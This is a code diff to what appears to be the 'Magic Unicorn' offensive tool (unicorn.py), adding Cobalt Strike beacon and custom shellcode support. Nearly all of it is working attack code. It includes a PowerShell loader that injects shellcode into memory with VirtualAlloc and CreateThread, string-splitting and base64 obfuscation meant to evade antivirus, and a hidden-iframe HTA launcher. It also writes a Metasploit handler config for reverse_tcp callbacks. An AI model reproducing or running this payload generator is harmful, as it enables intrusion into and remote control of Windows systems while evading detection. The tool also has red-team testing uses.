@@ -12,7 +12,8 @@
 # Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
 # HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
 #
-# Requirements: Need to have Metasploit installed.
+# Requirements: Need to have Metasploit installed if using Metasploit methods.
+# Also supports Cobalt Strike and custom shellcode delivery methods.
 #
 # Special thanks to Matthew Graeber and Josh Kelley
 #
@@ -147,7 +148,8 @@ def hta_help():
 The HTA attack will automatically generate two files, the first the index.html which tells the browser to
 use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
 hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
-last, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.
+last, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener 
+for Metasploit. If you didn't use Metasploit, only two files will be exported.
 
 A user must click allow and accept when using the HTA attack in order for the powershell injection to work
 properly.
@@ -264,9 +266,105 @@ The last one will use a 500 character string instead of the default 380, resulti
 	""")
 
 
+# cobalt strike usage banner
+def cobalt_strike():
+    print("""
+[*******************************************************************************************************]
+
+                -----Import Cobalt Strike Beacon----
+
+This method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.
+
+Within Cobalt Strike, export the Cobalt Strike "CS" (C#) export and save it to a file. For example, call 
+the file, cobalt_strike_file.cs. 
+
+The export code will look something like this:
+
+* length: 836 bytes */
+byte[] buf = new byte[836] { 0xfc, etc
+
+Next, for usage:
+
+python unicorn.py cobalt_strike_file.cs cs
+
+The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.
+
+Next simply copy the powershell command to something you have the ability for remote command execution.
+
+NOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.
+
+There are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte
+size. That means that from a command line argument perspective if you copy and paste you will hit the
+8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe
+this is an issue, however if you are launching directly from PowerShell or other normal applications
+this is a non-problem.
+
+A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING;
+
+For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no
+issues.
+
+[*******************************************************************************************************]
+    """)
+
+# this is used for custom shellcode generation
+def custom_shellcode():
+    print("""
+[*******************************************************************************************************]
+
+                -----Custom Shellcode Generation Method----
+
+This method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code
+will increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.
+
+Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the 
+following format or it will not work:
+
+0x00,0x00,0x00 and so on.
+
+Also note that there is size restrictions. The total length size of the PowerShell command cannot exceed
+the size of 8191. This is the max command line argument size limit in Windows.
+
+Usage:
+
+python uniocrn.py shellcode_formatted_properly.txt shellcode
+
+Next simply copy the powershell command to something you have the ability for remote command execution.
+
+NOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN
+YOUR SHELLCODE IN THE TXT FILE.
+
+There are some caveats with this attack. Note that if your payload size is large in nature it will not
+fit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will 
+hit the 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from 
+cmd.exe this is an issue, however if you are launching directly from PowerShell or other normal 
+applications this is a non-problem.
+
+A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING;
+
+For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  
+issues.
+
+
+[*******************************************************************************************************]
+    """)
+
+
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.14 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.0 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -282,6 +380,8 @@ def gen_usage():
     print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
+    print("Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)")
+    print("Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)")
     print("Help Menu: python unicorn.py --help\n")
 
 
@@ -433,15 +533,9 @@ def gen_hta_attack(command):
     shell_split4 = generate_random_string(10, 30)
     shell_split5 = generate_random_string(10, 30)
 
-    cmd_split1 = generate_random_string(10, 30)
-    cmd_split2 = generate_random_string(10, 30)
-    cmd_split3 = generate_random_string(10, 30)
-    cmd_split4 = generate_random_string(10, 30)
-    
     main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, shell_split5))
-    main2 = ("""{0} = "cm";\n{1} = "d.e";\n{2} = "xe";\n{3} = ({0} + {1} + {2});\n{4}.run('%windir%\\\\System32\\\\""".format(cmd_split1,cmd_split2,cmd_split3,cmd_split4,hta_rand))
-    main3 = ("""' + {0} + """.format(cmd_split4))
-    main4 = ("""' /c {0}', 0);window.close();\n</script>""".format(command))
+    main2 = ("""{0}.run('""".format(hta_rand))
+    main4 = ("""{0}', 0);window.close();\n</script>""".format(command))
     html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>""")
 
     # remote old directory
@@ -456,7 +550,7 @@ def gen_hta_attack(command):
 
     # write out Launcher.hta
     print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
-    write_file("hta_attack/Launcher.hta", main1 + main2 + main3 + main4)
+    write_file("hta_attack/Launcher.hta", main1 + main2 + main4)
 
 
 # generate the actual shellcode through msf
@@ -524,30 +618,34 @@ def generate_shellcode(payload, ipaddr, port):
 def gen_shellcode_attack(payload, ipaddr, port):
     # regular payload generation stuff
     # generate our shellcode first
-    shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
-    # sub in \x for 0x
-    shellcode = re.sub("\\\\x", "0x", shellcode)
-    # base counter
-    counter = 0
-    # count every four characters then trigger floater and write out data
-    floater = ""
-    # ultimate string
-    newdata = ""
-    for line in shellcode:
-        floater += line
-        counter += 1
-        if counter == 4:
-            newdata = newdata + floater + ","
-            floater = ""
-            counter = 0
+    if ipaddr != ("cobaltstrike"):
+        shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
+        # sub in \x for 0x
+        shellcode = re.sub("\\\\x", "0x", shellcode)
+        # base counter
+        counter = 0
+        # count every four characters then trigger floater and write out data
+        floater = ""
+        # ultimate string
+        newdata = ""
+        for line in shellcode:
+            floater += line
+            counter += 1
+            if counter == 4:
+                newdata = newdata + floater + ","
+                floater = ""
+                counter = 0
 
-    # here's our shellcode prepped and ready to go
-    shellcode = newdata[:-1]
+        # here's our shellcode prepped and ready to go
+        shellcode = newdata[:-1]
+    
+        # if we aren't using download/exec
+        if not "url=" in ipaddr:
+            # write out rc file
+            write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
 
-    # if we aren't using download/exec
-    if not "url=" in ipaddr:
-        # write out rc file
-        write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
+    # switch variable to be shellcode for formatting
+    if ipaddr == "cobaltstrike": shellcode = payload
 
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
@@ -562,7 +660,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     var9 = "$" + generate_random_string(2, 2) # $g
     var10 = "$" + generate_random_string(2, 2) # $i
     var11 = "$" + generate_random_string(2, 2) # $w
-    var12 = (str(generate_random_number(1001,1020)))
+    var12 = (str(generate_random_number(1001,1024)))
 
     # one line shellcode injection with native x86 shellcode
     powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x$randstack;if ($z.Length -gt 0x$randstack){$g = $z.Length};$x=$w::VirtualAlloc(0,0x$randstack,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
@@ -616,6 +714,30 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     full_attack = '''powershell /w 1 /C "s''v {0} -;s''v {1} e''c;s''v {2} ((g''v {3}).value.toString()+(g''v {4}).value.toString());powershell (g''v {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
 
+    # for cobalt strike
+    if attack_type == "cs":
+        if attack_modifier == "hta":
+            gen_hta_attack(full_attack)
+            cobalt_strike()
+            hta_help()
+            print("[*] Exported the custom hta_attack vector to hta_attacks/. This folder contains everything you need for CS or your custom shellcode. Enjoy!\n")
+        else:
+            write_file("powershell_attack.txt", full_attack)
+            cobalt_strike()
+            print("[*] Exported the Cobalt Strike Unicorn Attack codebase out to powershell_attack.txt. Enjoy!\n")
+
+    # for custom shellcode
+    if attack_type == "shellcode":
+        if attack_modifier == "hta":
+            gen_hta_attack(full_attack)
+            custom_shellcode()
+            hta_help()
+            print("[*] Exported the hta attack vector to hta_attacks/. This folder contains everything you need. Enjoy!\n")
+        else:
+            write_file("powershell_attack.txt", full_attack)
+            custom_shellcode()
+            print("[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\n")
+
     if attack_type == "msf" or attack_type == "download/exec":
         if attack_modifier == "macro":
             macro_attack = generate_macro(full_attack)
@@ -648,7 +770,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
                 ps_help() # present normal powershell attack instructions
 
             # if we are using dde attack, present that method
-            if attack_modifier == "dde": 
+            if attack_modifier == "dde":
                 dde_help()
 
     elif attack_type == "custom_ps1":
@@ -661,8 +783,11 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         custom_ps1_help()
 
     else:
-        write_file("powershell_attack.txt", full_attack)
-        ps_help()
+        if attack_type != "cs":
+            if attack_type != "shellcode":
+                if attack_modifier != "hta":
+                   write_file("powershell_attack.txt", full_attack)
+                   ps_help()
 
     # Print completion messages
     if attack_type == "msf" and attack_modifier == "hta":
@@ -702,6 +827,7 @@ try:
             cert_help()
             custom_ps1_help()
             dde_help()
+            cobalt_strike()
             gen_usage()
             sys.exit()
         else:
@@ -716,6 +842,14 @@ try:
                 attack_type = "download/exec"
                 port = "none"
 
+            elif sys.argv[2] == "cs":
+                attack_type = "cs"
+                if "hta" in sys.argv: 
+                    attack_modifier = "hta"
+
+            elif sys.argv[2] == "shellcode":
+                attack_type = "shellcode"
+
             else:
                 attack_type = "msf"
                 payload = sys.argv[1]
@@ -727,9 +861,33 @@ try:
             port = sys.argv[3]
             attack_modifier = sys.argv[4]
             ps = gen_shellcode_attack(payload, ipaddr, port)
+
+
         else:
             print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit(1)
+
+        format_payload(ps, attack_type, attack_modifier, None)
+
+    # this is our cobalt strike and custom shellcode menu
+    elif attack_type == "cs" or attack_type == "shellcode": 
+        if not os.path.isfile(sys.argv[1]): 
+            print("[!] File not found. Check the path and try again.")
+            sys.exit()
+        payload = file(sys.argv[1], "r").read()
+        if attack_type == "cs":
+            #if not "char buf[] =" in payload:
+            if not "byte[] buf = new byte" in payload:
+                print("[!] Cobalt Strike file either not formatted properly or not the C#/CS format.")
+                sys.exit()
+            payload = payload.split("{")[1].replace(" };", "").replace(" ", "") # stripping out so we have 0x00 format
+            #payload = payload.split(' char buf[] = "')[1].replace("\\x", ",0x").replace(",", "", 1).replace('";', "")
+
+        ipaddr = "cobaltstrike"
+        port = "cobaltstrike"
+        ps = gen_shellcode_attack(payload, ipaddr, port)
+        if attack_modifier != "hta":
+            attack_modifier = ("cs")
 
         format_payload(ps, attack_type, attack_modifier, None)
 
@@ -757,7 +915,7 @@ try:
         format_payload(ps, attack_type, attack_modifier, option)
 
     elif len(sys.argv) == 3:
-        # Matthews base64 cert attack
+        # Matthews base64 cert attack or cs
         if attack_type == "crt":
             cert_help()
             # generate the attack vector
@@ -766,6 +924,7 @@ try:
             attack_modifier = sys.argv[2]
             ps = gen_ps1_attack(ps1path)
             format_payload(ps, attack_type, attack_modifier, None)
+
         else:
             print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit()
